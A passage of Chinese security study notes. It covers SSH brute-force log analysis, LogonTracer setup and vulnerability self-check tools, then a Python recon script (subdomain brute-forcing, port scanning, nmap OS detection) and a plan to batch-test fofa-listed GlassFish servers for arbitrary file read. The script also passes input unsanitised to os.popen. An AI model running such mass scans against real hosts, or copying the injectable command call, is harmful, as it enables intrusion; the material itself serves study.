class="hljs-keyword">win</span>系统中需开启审核策略（成功、失败），同时查看windows日志，关注事件归类、事件ID、事件状态等<br>或者通过工具查看RDP<br><br>对于SSH爆破的查看：<br>1、统计日志，确认服务器遭受多少次暴力破解<br>	grep -o <span class="hljs-string">&quot;Failed password&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure|uniq -c<br>2、输出登录爆破的第一行和最后一行，确认爆破时间范围<br>	grep <span class="hljs-string">&quot;Failed password&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure|head -1 grep <span class="hljs-string">&quot;Failed password&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure|tail -1<br>3、进一步定位有哪些 IP 在爆破<br>	grep <span class="hljs-string">&quot;Failed password&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure|grep -<span class="hljs-keyword">E</span> -o <span class="hljs-string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[04][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][09]?)&quot;</span>|uniq -c | <span class="hljs-keyword">sort</span> -nr<br>4、爆破用户名字典都有哪些<br>	grep <span class="hljs-string">&quot;Failed password&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure|perl -<span class="hljs-keyword">e</span> &#x27;<span class="hljs-keyword">while</span>(<span class="hljs-variable">$_</span>=&lt;&gt;)&#123; /<span class="hljs-keyword">for</span>(.*?) from/; <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$1\n&quot;</span>;&#125;&#x27;|uniq -c|<span class="hljs-keyword">sort</span> nr<br>5、登录成功的日期、用户名、IP<br>	grep <span class="hljs-string">&quot;Accepted &quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure | awk &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$1</span>,<span class="hljs-variable">$2</span>,<span class="hljs-variable">$3</span>,<span class="hljs-variable">$9</span>,<span class="hljs-variable">$11&#125;</span>&#x27; grep <span class="hljs-string">&quot;Accepted &quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure | awk &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$11&#125;</span>&#x27; | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr | <span class="hljs-keyword">more</span><br></code></pre></td></tr></table></figure>



<h3 id="第三方应用分析及应急取证"><a href="#第三方应用分析及应急取证" class="headerlink" title="第三方应用分析及应急取证"></a>第三方应用分析及应急取证</h3><blockquote>
<p>1、第三方应用由于是选择性安装，如何做好信息收集和漏洞探针也是获取攻击者思路的重要操作，除去本身漏洞外，提前预知与口令相关的攻击也要进行筛选。</p>
<p>2、排除第三方应用攻击行为，自查漏洞分析攻击者思路，人工配合工具脚本</p>
<p>3、由于工具和脚本更新迭代快、分类复杂，那么打造自己的工具箱迫在眉睫</p>
</blockquote>
<p><strong>win日志分析神器 - LogonTracer</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stylus">下载地址：https:<span class="hljs-comment">//github.com/JPCERTCC/LogonTracer</span><br>环境配置：<br>如果是阿里云主机需要开放端口并关闭防火墙<br><span class="hljs-number">1</span>、下载并解压neo4j<br>	git clone https:<span class="hljs-comment">//github.com/neo4j/neo4j</span><br>	tar -zvxf neo4j-community-<span class="hljs-number">4.2</span>.<span class="hljs-number">1</span>-unix<span class="hljs-selector-class">.tar</span><br><span class="hljs-number">2</span>、安装java11环境<br>	sudo yum install java-<span class="hljs-number">11</span>-openjdk -y<br><span class="hljs-number">3</span>、修改neo4j配置保证外部访问<br>	dbms<span class="hljs-selector-class">.connector</span><span class="hljs-selector-class">.bolt</span>.listen_address=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">6699</span><br><span class="hljs-number">4</span>、开启neo4j<br>	./bin/neo4j console &amp;<br><span class="hljs-number">5</span>、下载Logontracer并安装库<br>	git clone https:<span class="hljs-comment">//github.com/JPCERTCC/LogonTracer.git</span><br>	pip3 install -r requirements<span class="hljs-selector-class">.txt</span><br><span class="hljs-number">6</span>、启动Logontracer并导入日志分析文件<br>	python3 logontracer<span class="hljs-selector-class">.py</span> -r -o <span class="hljs-selector-attr">[PORT]</span> -u <span class="hljs-selector-attr">[USERNAME]</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-selector-attr">[PASSWORD]</span> -s <span class="hljs-selector-attr">[IP 地址]</span><br>	python3 logontracer<span class="hljs-selector-class">.py</span> -e <span class="hljs-selector-attr">[EVTX 文件]</span> -z <span class="hljs-selector-attr">[时区]</span> -u <span class="hljs-selector-attr">[用户名]</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-selector-attr">[密码]</span> -s <span class="hljs-selector-attr">[IP 地址]</span><br><span class="hljs-number">7</span>、刷新访问LogonTracer-web_gui，查看分析结果<br></code></pre></td></tr></table></figure>



<p><strong>数据库（Mysql、Msql、Oracle等）日志分析（爆破注入）</strong></p>
<p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等，对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景和溯源攻击源</p>
<ul>
<li><h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-number">1</span>、日志启用并查看<br>	show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&quot;%gengeral&quot;</span>;<br>	<span class="hljs-keyword">SET</span> GLOBAL <span class="hljs-comment">general_log =</span> <span class="hljs-comment">&#x27;On&#x27;</span>;<br>	# 这里可以设置mysql日志存放目录<br>	<span class="hljs-keyword">SET</span> GLABAL <span class="hljs-comment">general_log_file =</span> <span class="hljs-comment">&#x27;/var/lib/mysql/mysql.log&#x27;</span><br>2、查看日志并分析<br></code></pre></td></tr></table></figure>
</li>
<li><h4 id="Mssql"><a href="#Mssql" class="headerlink" title="Mssql"></a>Mssql</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1、查看日志<br>2、配置跟踪文件<br>3、查看日志并分析<br></code></pre></td></tr></table></figure></li>
</ul>
<p><strong>自查漏洞模拟渗透测试寻找攻击源（漏洞、口令检索）</strong></p>
<p>主要针对以下两种情况：</p>
<ul>
<li>日志被删或没利用价值</li>
<li>没有思路进行分析且可以采用模拟渗透</li>
</ul>
<p><strong>系统漏洞自查（win、lin）</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">主要工具为WindowsvulnScan、linux-exploit-suggester<br><span class="hljs-number">1</span>、windows自查<br>	python cve-check.py -C -f KB.json 如果出现报错，将KB.json切换为utf-<span class="hljs-number">8</span>模式<br><span class="hljs-number">2</span>、linux自查<br>	./linux-exploit-suggester.sh<br>工具地址<br>	https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/chroblert/</span>WindowsVulnScan<br>	https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mzet-/</span>linux-exploit-suggester<br></code></pre></td></tr></table></figure>



<p><strong>服务漏洞自查</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>、Windows<br>	Get-WmiObject -class Win32_Product<br><span class="hljs-number">2</span>、Linux<br>	./LinEnum.sh<br>	下载地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnum<br><span class="hljs-number">3</span>、根据检索出来的服务进行漏洞扫描 主要使用searchsploit，比如weblogic<br>	searchsploit weblogic<br></code></pre></td></tr></table></figure>



<p><strong>自动化工具ir-rescue应急响应工具箱</strong></p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/diogo-fernan/ir-rescue">https://github.com/diogo-fernan/ir-rescue</a></p>
<h1 id="十、Python安全开发"><a href="#十、Python安全开发" class="headerlink" title="十、Python安全开发"></a>十、Python安全开发</h1><img src="/img/25.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />

<blockquote>
<p>Python开发学习的目标：</p>
<p>​	学习相关安全工具的原理</p>
<p>​	掌握自定义安全工具以及拓展安全</p>
<p>​	掌握实战中无工具或手工复杂批量化等情况</p>
<p>​	在二次开发Bypass，日常任务，批量测试利用等方便均有帮助</p>
<p>​	ex：SRC批量收集，AWD批量利用获取FLAG，CTF加解密脚本等</p>
<p>其中涉及的技术：</p>
<p>Socket，正则，爬虫以及框架开发等</p>
<p>python 多线程 用法</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/briblue/article/details/85101144">https://blog.csdn.net/briblue/article/details/85101144</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/j6-2/p/4645490.html">https://www.cnblogs.com/j6-2/p/4645490.html</a></p>
</blockquote>
<p><img src="/img/26.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="信息收集-5"><a href="#信息收集-5" class="headerlink" title="信息收集"></a>信息收集</h3><p>在信息收集中分为对外网的信息收集以及对于内网的信息收集。</p>
<p>其中对于外网的信息收集中需要收集外网的IP地址与Whois信息，同时需要对外网的网站进行CDN判断，进一步之后需要对外网进行端口扫描，对包含的子域名进行收集。</p>
<p>在对内网的信息收集中，需要对内网中的存活主机进行探查，还要对其中的协议进行探针，还需要对内网中的机器进行端口扫描。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs python">IP 查询<br>① 功能 输入域名如 www.baidu.com;返回解析的 IP<br>② 原理 Python中的socket模块的gethostbyname 函数能够实现解析域名IP地址的功能<br>③ 代码<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-comment">#域名反查IP</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ip_search</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment">#ce.mianshiya.com</span><br>    ip = socket.gethostbyname(url)<br>    <span class="hljs-built_in">print</span>(url + <span class="hljs-string">&#x27;-&gt;&#x27;</span> + ip)<br><br>whois 查询<br>① 功能 输入目标地址，能够查询目标的 whois 信息<br>② 原理 Python 的 whois 模块的 whois 函数能够获取目标的 whois 信息；需要导入 python-whois 模块<br>③ 代码<br><span class="hljs-keyword">from</span> whois <span class="hljs-keyword">import</span> whois<br><span class="hljs-comment">#whois 查询</span><br><span class="hljs-comment">#第三方库进行whois查询也可以利用网上接口进行查询</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">whois_check</span>(<span class="hljs-params">url</span>):<br>    data = whois(url)<br>    <span class="hljs-built_in">print</span>(data)<br><br>CDN 判断<br>① 功能 输入目标地址，能够判断目标是否是 CDN 服务器<br>② 原理 Python 通过 os 库的 system 函数调用执行系统的 nslookup 命令来解析目标地址，如果解析 目标地址的 IP 地址过多，那么说明使用了 CDN 服务器。<br>③ 代码<br><span class="hljs-keyword">import</span> os<br><span class="hljs-comment">#识别目标是否存在cdn</span><br><span class="hljs-comment">#正则表达式匹配数目判断</span><br><span class="hljs-comment">#采用nslookup结果进行返回ip解析数目判断</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cdn_check</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment">#cdn_date = os.system(&#x27;nslookup www.baidu.com&#x27;)</span><br>    cdn_date = os.popen(<span class="hljs-string">&#x27;nslookup &#x27;</span> + url)<br>    cdn_dates = cdn_date.read()<br>    x = cdn_dates.count(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">11</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;存在cdn&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不存在cdn&quot;</span>)<br><br>子域名查询<br>① 实现功能 查询目标的子域名<br>② 原理 如输入 www.baidu.com；先正则去掉 www;然后加载字典，如内容为 aa;与处理后的 url 进行 拼接，即 aa.baidu.com；然后调用 socket 模块的 gethostbyname 函数来判断该域名是否能够 解析 IP，如果能说明该域名存在，不能则说明不存在。<br>③ 代码<br><span class="hljs-keyword">import</span> socket,time<br><span class="hljs-comment">#子域名查询</span><br><span class="hljs-comment">#1.利用字典加载爆进行查询</span><br><span class="hljs-comment">#2.利用bing或第三方接口进行查询</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zym_chech</span>(<span class="hljs-params">url</span>):<br>    urls = url.replace(<span class="hljs-string">&#x27;www&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">for</span> zym_data <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dic.txt&#x27;</span>):<br>        zym_data = zym_data.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        url_z = zym_data + urls<br>        <span class="hljs-keyword">try</span>:<br>            ip = socket.gethostbyname(url_z)<br>            <span class="hljs-built_in">print</span>(url_z + <span class="hljs-string">&#x27;-&gt;&#x27;</span> + ip)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">pass</span><br>            <span class="hljs-comment">#print(&#x27;error&#x27;)</span><br><br>端口扫描<br>① 实现功能 能判断对应端口是否开放<br>② 原理 Socket 模块的 socket 函数，socket函数返回一个socket句柄，该函数有两个参数，其中包含family和<span class="hljs-built_in">type</span>，family指定网络类型，<span class="hljs-built_in">type</span>指定socket类型：<br>family: socketAF_UNIX — Unix网络 、 socketAF_INET — 基于IPv4协议的网络 、 socketAF_INET6 — 基于IPv6协议的网络<br><span class="hljs-built_in">type</span>: SOCK_STREAM — 默认值，创建基于TCP协议的socket 、 SOCK_DGRAM — 创建基于UDP协议的socket 、 SOCK_RAW — 创建原始socket<br>③ 代码<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-comment">#端口扫描</span><br><span class="hljs-comment">#1.自写socket协议tcp，udp扫描</span><br><span class="hljs-comment">#2.调用第三方模块扫描</span><br><span class="hljs-comment">#3.调用系统工具脚本</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">port_scan</span>(<span class="hljs-params">url</span>):<br>    ip = socket.gethostbyname(url)<br>    port_number = [<span class="hljs-number">8888</span>,<span class="hljs-number">80</span>,<span class="hljs-number">135</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">21</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">8000</span>,<span class="hljs-number">7002</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">9090</span>,<span class="hljs-number">8089</span>,<span class="hljs-number">4848</span>,<span class="hljs-number">22</span>]<br>    <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> port_number:<br>        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>        <span class="hljs-keyword">try</span>:<br>          result = server.connect_ex((ip,index))<br>          <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>              <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&#x27; port open&#x27;</span>)<br>          <span class="hljs-keyword">else</span>:<br>              <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&#x27; port close&#x27;</span>)<br>              <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> err:<br>        			<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;error&#x27;</span>)<br><br>系统判断<br>① 实现功能 判断对应系统<br>② 原理 Python 通过 os 库的 system 函数调用执行nmap对目标地址进行系统解析。<br>③ 代码<br><span class="hljs-keyword">import</span> os<br><span class="hljs-comment">#系统判断</span><br><span class="hljs-comment">#基于TTL值进行判断</span><br><span class="hljs-comment">#基于第三方脚本进行判断</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">os_check</span>(<span class="hljs-params">url</span>):<br>    data = os.popen(<span class="hljs-string">&quot;nmap\\nmap -O &quot;</span>+url,<span class="hljs-string">&quot;r&quot;</span>).read()<br>    <span class="hljs-built_in">print</span>(data)<br><br><br>总代码：<br><br><span class="hljs-keyword">import</span> socket,os,time,sys<br><span class="hljs-keyword">from</span> whois <span class="hljs-keyword">import</span> whois<br><br><span class="hljs-comment">#域名反查IP</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ip_search</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment">#ce.mianshiya.com</span><br>    ip = socket.gethostbyname(url)<br>    <span class="hljs-built_in">print</span>(url + <span class="hljs-string">&#x27;-&gt;&#x27;</span> + ip)<br><br><span class="hljs-comment">#识别目标是否存在cdn</span><br><span class="hljs-comment">#正则表达式匹配数目判断</span><br><span class="hljs-comment">#采用nslookup结果进行返回ip解析数目判断</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cdn_check</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment">#cdn_date = os.system(&#x27;nslookup www.xiaodi8.com&#x27;)</span><br>    cdn_date = os.popen(<span class="hljs-string">&#x27;nslookup &#x27;</span> + url)<br>    cdn_dates = cdn_date.read()<br>    x = cdn_dates.count(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">11</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;存在cdn&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不存在cdn&quot;</span>)<br><br><span class="hljs-comment">#端口扫描</span><br><span class="hljs-comment">#1.自写socket协议tcp，udp扫描</span><br><span class="hljs-comment">#2.调用第三方模块扫描</span><br><span class="hljs-comment">#3.调用系统工具脚本</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">port_scan</span>(<span class="hljs-params">url</span>):<br>    ip = socket.gethostbyname(url)<br>    port_number = [<span class="hljs-number">8888</span>,<span class="hljs-number">80</span>,<span class="hljs-number">135</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">21</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">8000</span>,<span class="hljs-number">7002</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">9090</span>,<span class="hljs-number">8089</span>,<span class="hljs-number">4848</span>,<span class="hljs-number">22</span>]<br>    <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> port_number:<br>        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>        result = server.connect_ex((ip,index))<br>        <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&#x27; port open&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&#x27; port close&#x27;</span>)<br><br><span class="hljs-comment">#whois 查询</span><br><span class="hljs-comment">#第三方库进行whois查询也可以利用网上接口进行查询</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">whois_check</span>(<span class="hljs-params">url</span>):<br>    data = whois(url)<br>    <span class="hljs-built_in">print</span>(data)<br><br><span class="hljs-comment">#系统判断</span><br><span class="hljs-comment">#基于TTL值进行判断</span><br><span class="hljs-comment">#基于第三方脚本进行判断</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">os_check</span>(<span class="hljs-params">url</span>):<br>    data = os.popen(<span class="hljs-string">&quot;nmap\\nmap -O &quot;</span>+url,<span class="hljs-string">&quot;r&quot;</span>).read()<br>    <span class="hljs-built_in">print</span>(data)<br><br><br><span class="hljs-comment">#子域名查询</span><br><span class="hljs-comment">#1.利用字典加载爆进行查询</span><br><span class="hljs-comment">#2.利用bing或第三方接口进行查询</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zym_chech</span>(<span class="hljs-params">url</span>):<br>    urls = url.replace(<span class="hljs-string">&#x27;www&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">for</span> zym_data <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dic.txt&#x27;</span>):<br>        zym_data = zym_data.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        url_z = zym_data + urls<br>        <span class="hljs-keyword">try</span>:<br>            ip = socket.gethostbyname(url_z)<br>            <span class="hljs-built_in">print</span>(url_z + <span class="hljs-string">&#x27;-&gt;&#x27;</span> + ip)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">pass</span><br>            <span class="hljs-comment">#print(&#x27;error&#x27;)</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    check = sys.argv[<span class="hljs-number">1</span>]<br>    url = sys.argv[<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">if</span> check == <span class="hljs-string">&#x27;i&#x27;</span>:<br>        ip_search(url)<br>    <span class="hljs-keyword">if</span> check == <span class="hljs-string">&#x27;c&#x27;</span>:<br>        cdn_check(url)<br>    <span class="hljs-keyword">if</span> check == <span class="hljs-string">&#x27;w&#x27;</span>:<br>        whois_check(url)<br>    <span class="hljs-keyword">if</span> check == <span class="hljs-string">&#x27;o&#x27;</span>:<br>        os_check(url)<br>    <span class="hljs-keyword">if</span> check == <span class="hljs-string">&#x27;z&#x27;</span>:<br>        zym_chech(url)<br>    <span class="hljs-keyword">if</span> check == <span class="hljs-string">&#x27;all&#x27;</span>:<br>        ip_search(url)<br>        cdn_check(url)<br>        whois_check(url)<br>        os_check(url)<br>        zym_chech(url)<br>    <span class="hljs-comment">#port_scan(&#x27;www.xiaodi8.com&#x27;)</span><br></code></pre></td></tr></table></figure>



<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p><strong>python + Glassfish利用</strong></p>
<ol>
<li><p>漏洞信息 ：应用服务器 glassfish 任意文件读取</p>
</li>
<li><p>实现功能 ：批量的验证是否存在 glassfish 任意文件读取漏洞</p>
</li>
<li><p>实现思路</p>
<ol>
<li><p>筛选出存在 glassfish 的服务器 IP 具体实现：</p>
<p>借助 fofa 搜索，搜索语法为”glassfish” &amp;&amp; port&#x3D;”4848”</p>
<p>通过爬虫爬取 fofa 搜索的全部结果</p>
<p>通过 lxml 库提取爬取到的内容中的地址信息。</p>
</li>
<li><p>批量验证存在 glassfish 的应用是否存在任意文件读取漏洞的两个 poc 分别对应 linux 和 windows</p>
</li>
<li><p>读取从 fofa 输出的结果，将漏洞 poc 中的地址进行替换，发起 get 请求，根据请求的响应状态码来判断是否存在漏洞。</p>
</li>
</ol>
</li>
<li><p>注意</p>
<ol>
<li>windows 和 Linux 下读取的文件是不同的</li>
<li>爬虫爬取 fofa 的输出结果编码成 utf-8，看起来更容易</li>
<li>爬取 fofa 后面的内容时，需要将登录的 cookie 信息放入请求头中，cookie 从浏览器中获取</li>
</ol>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 